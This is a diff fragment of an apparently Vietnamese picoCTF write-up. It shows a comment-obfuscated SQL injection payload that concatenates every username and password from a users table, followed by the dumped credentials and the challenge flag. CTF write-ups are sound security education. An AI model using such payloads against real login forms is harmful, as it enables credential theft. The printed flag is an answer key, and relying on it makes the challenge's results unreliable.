@@ -30,6 +30,7 @@ WHERE username = '<username>' AND password = '<password>';
 - payload 3: dump giá trị
  ` 
 '||(SELECT/**/GROUP_CONCAT(nameuser||':'||wordpass,/**/'|')/**/FROM/**/startup_users)||'
+`
 - thu được
- ` $admin:password|ron:not_the_flag_db1d1c41|veronica:not_the_flag_de19f38f|brick:not_the_flag_6d8cfc3e|brian:not_the_flag_f96b8d32|champ:not_the_flag_3e25274b|the_real_flag:picoCTF{1_c4nn0t_s33_y0u_58183fce}|qwwe:qwe
+$admin:password|ron:not_the_flag_db1d1c41|veronica:not_the_flag_de19f38f|brick:not_the_flag_6d8cfc3e|brian:not_the_flag_f96b8d32|champ:not_the_flag_3e25274b|the_real_flag:picoCTF{1_c4nn0t_s33_y0u_58183fce}|qwwe:qwe
 - Flag :  picoCTF{1_c4nn0t_s33_y0u_58183fce}
